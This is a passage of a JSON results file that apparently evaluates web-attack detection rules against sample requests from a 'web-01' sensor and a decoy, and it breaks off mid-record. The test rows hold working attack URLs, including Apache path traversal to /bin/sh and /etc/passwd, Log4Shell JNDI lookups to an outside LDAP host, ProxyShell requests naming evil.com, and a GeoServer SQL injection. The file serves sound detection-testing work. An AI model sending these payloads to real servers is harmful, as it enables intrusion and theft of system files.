+   "signature": "sg-lnx-exploit-cve-2025-31324-sap-1",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-31324/web_lnx_exploit_cve_2025_31324_sap_netviewer_webshell.yml",
+   "title": "Potential SAP NetViewer Webshell Command Execution",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-lnx-exploit-cve-2025-31324-sap-2",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-31324/web_lnx_exploit_cve_2025_31324_sap_netviewer_webshell.yml",
+   "title": "Potential SAP NetViewer Webshell Command Execution",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-lnx-exploit-cve-2025-31324-sap-3",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-31324/web_lnx_exploit_cve_2025_31324_sap_netviewer_webshell.yml",
+   "title": "Potential SAP NetViewer Webshell Command Execution",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-invanti-epmm-cve-2025-4427-and-cve-1",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-4427/web_invanti_epmm_cve_2025_4427_and_cve_2025_4428.yml",
+   "title": "Potential Exploitation of CVE-2025-4427/4428 Ivanti EPMM Pre-Auth RCE",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-invanti-epmm-cve-2025-4427-and-cve-2",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-4427/web_invanti_epmm_cve_2025_4427_and_cve_2025_4428.yml",
+   "title": "Potential Exploitation of CVE-2025-4427/4428 Ivanti EPMM Pre-Auth RCE",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-invanti-epmm-cve-2025-4427-and-cve-3",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-4427/web_invanti_epmm_cve_2025_4427_and_cve_2025_4428.yml",
+   "title": "Potential Exploitation of CVE-2025-4427/4428 Ivanti EPMM Pre-Auth RCE",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-invanti-epmm-cve-2025-4427-and-cve-4",
+   "path": "rules-emerging-threats/2025/Exploits/CVE-2025-4427/web_invanti_epmm_cve_2025_4427_and_cve_2025_4428.yml",
+   "title": "Potential Exploitation of CVE-2025-4427/4428 Ivanti EPMM Pre-Auth RCE",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2026-63030-batch-rest",
+   "path": "rules-emerging-threats/2026/Exploits/CVE-2026-63030/web_exploit_cve_2026_63030_batch_rest_route_abuse.yml",
+   "title": "WordPress Wp2shell REST Batch Endpoint Exploitation",
+   "pure": true,
+   "statuses": [
+    207
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2026-63030-webshell",
+   "path": "rules-emerging-threats/2026/Exploits/CVE-2026-63030/web_exploit_cve_2026_63030_webshell_plugin_access.yml",
+   "title": "WordPress Wp2shell Webshell Plugin Access",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  }
+ ],
+ "control": {
+  "temp_rows": 90,
+  "samples": 45,
+  "sg1_equals_expected_web01": true,
+  "totals": {
+   "rows": 90,
+   "sg1": 38,
+   "c1": 36,
+   "sgx": 42,
+   "sg1_and_c1": 18,
+   "sg1_only": 20,
+   "c1_only": 18,
+   "status_excluded": 8
+  },
+  "rows": [
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+    "status": 301,
+    "sg1": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+    "status": 301,
+    "sg1": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+    "status": 404,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+    "status": 404,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/cgi-bin/.%2e/.%2e/bin/sh",
+    "status": null,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/cgi-bin/.%2e/.%2e/bin/sh",
+    "status": null,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-cve-2021-41773-apache-path-traversal"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/cgi-bin/../../../../bin/sh",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/cgi-bin/../../../../bin/sh",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/cgi-bin/../../../etc/passwd",
+    "status": 404,
+    "sg1": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": [
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/cgi-bin/../../../etc/passwd",
+    "status": 404,
+    "sg1": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [
+     "apache-path-traversal"
+    ],
+    "sgx": [
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/cgi-bin/status.cgi",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/cgi-bin/status.cgi",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/icons/apache_pb.png",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/icons/apache_pb.png",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/?x=${jndi:ldap://203.0.113.5/a}",
+    "status": 404,
+    "sg1": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "c1": [
+     "log4shell-in-path"
+    ],
+    "sgx": [
+     "sg-cve-2021-44228-log4j",
+     "sg-cve-2021-44228-log4j-fields",
+     "sg-ssti-in-access-logs"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/?x=${jndi:ldap://203.0.113.5/a}",
+    "status": 404,
+    "sg1": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "c1": [
+     "log4shell-in-path"
+    ],
+    "sgx": [
+     "sg-cve-2021-44228-log4j",
+     "sg-cve-2021-44228-log4j-fields",
+     "sg-ssti-in-access-logs"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/%24%7Bjndi:ldap://203.0.113.5/a%7D",
+    "status": 400,
+    "sg1": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "c1": [
+     "log4shell-in-path"
+    ],
+    "sgx": [
+     "sg-cve-2021-44228-log4j",
+     "sg-cve-2021-44228-log4j-fields"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/%24%7Bjndi:ldap://203.0.113.5/a%7D",
+    "status": 400,
+    "sg1": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-44228-log4j"
+    ],
+    "c1": [
+     "log4shell-in-path"
+    ],
+    "sgx": [
+     "sg-cve-2021-44228-log4j",
+     "sg-cve-2021-44228-log4j-fields"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/${jndi:ldap://w.nessus.org/nessus}",
+    "status": 404,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "log4shell-in-path"
+    ],
+    "sgx": [
+     "sg-cve-2021-44228-log4j-fields"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/${jndi:ldap://w.nessus.org/nessus}",
+    "status": 404,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "log4shell-in-path"
+    ],
+    "sgx": [
+     "sg-cve-2021-44228-log4j-fields"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/docs/jndi-lookup.html",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/docs/jndi-lookup.html",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/search?q=%24%7Bprice%7D",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/search?q=%24%7Bprice%7D",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2019-3398-confluence"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2019-3398-confluence"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-cve-2019-3398-confluence"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2019-3398-confluence"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2019-3398-confluence"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-cve-2019-3398-confluence"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=report.pdf&size=8",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=report.pdf&size=8",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/json/setup-restore.action?synchronous=true",
+    "status": 200,
+    "sg1": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "sg1_nostatus": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/json/setup-restore.action?synchronous=true",
+    "status": 200,
+    "sg1": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "sg1_nostatus": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/json/setup-restore-local.action",
+    "status": 302,
+    "sg1": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "sg1_nostatus": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/json/setup-restore-local.action",
+    "status": 302,
+    "sg1": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "sg1_nostatus": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/json/setup-restore.action",
+    "status": 404,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/json/setup-restore.action",
+    "status": 404,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-exploit-cve-2023-22518-confluence"
+    ],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/server-info.action",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/server-info.action",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/json/startheartbeatactivity.action",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/json/startheartbeatactivity.action",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2020-0688-msexchange"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2020-0688-msexchange"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-cve-2020-0688-exchange-exploit",
+     "sg-cve-2020-0688-msexchange"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2020-0688-msexchange"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2020-0688-msexchange"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-cve-2020-0688-exchange-exploit",
+     "sg-cve-2020-0688-msexchange"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/ecp/default.aspx?__VIEWSTATE=x",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/ecp/default.aspx?__VIEWSTATE=x",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail%2fowa%2f",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "exchange-owa"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail%2fowa%2f",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "exchange-owa"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
+    "status": 401,
+    "sg1": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
+    "status": 401,
+    "sg1": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json/EWS/Exchange.asmx",
+    "status": 401,
+    "sg1": [
+     "sg-exchange-proxyshell-1"
+    ],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-1"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-1"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json/EWS/Exchange.asmx",
+    "status": 401,
+    "sg1": [
+     "sg-exchange-proxyshell-1"
+    ],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-1"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-1"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json%3f@foo.com",
+    "status": 401,
+    "sg1": [
+     "sg-exchange-proxyshell-2"
+    ],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-2"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-2"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json%3f@foo.com",
+    "status": 401,
+    "sg1": [
+     "sg-exchange-proxyshell-2"
+    ],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-2"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-2"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json?@x.com/powershell/?X-Rps-CAT=abc",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-successful"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/autodiscover/autodiscover.json?@x.com/powershell/?X-Rps-CAT=abc",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [
+     "sg-exchange-proxyshell-1",
+     "sg-exchange-proxyshell-2"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-exchange-proxyshell-successful"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "POST",
+    "url": "/autodiscover/autodiscover.xml",
+    "status": 401,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "POST",
+    "url": "/autodiscover/autodiscover.xml",
+    "status": 401,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27x%27%27)+%3D+true+AND+1%3D(SELECT+CAST+((SELECT+version())+AS+integer))+--+%27)+%3D+true",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2023-25157-geoserver-sql"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2023-25157-geoserver-sql"
+    ],
+    "c1": [
+     "geoserver"
+    ],
+    "sgx": [
+     "sg-cve-2023-25157-geoserver-sql"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27x%27%27)+%3D+true+AND+1%3D(SELECT+CAST+((SELECT+version())+AS+integer))+--+%27)+%3D+true",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2023-25157-geoserver-sql"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2023-25157-geoserver-sql"
+    ],
+    "c1": [
+     "geoserver"
+    ],
+    "sgx": [
+     "sg-cve-2023-25157-geoserver-sql"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/geoserver/ows?service=WFS&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27Tex%27)%3Dtrue",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "geoserver"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/geoserver/ows?service=WFS&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27Tex%27)%3Dtrue",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "geoserver"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/geoserver/web/",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "geoserver"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/geoserver/web/",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "geoserver"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd",
+    "status": 404,
+    "sg1": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd",
+    "status": 404,
+    "sg1": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": [
+     "sg-cve-2019-11510-pulsesecure-exploit",
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana/html5acc/guacamole/",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
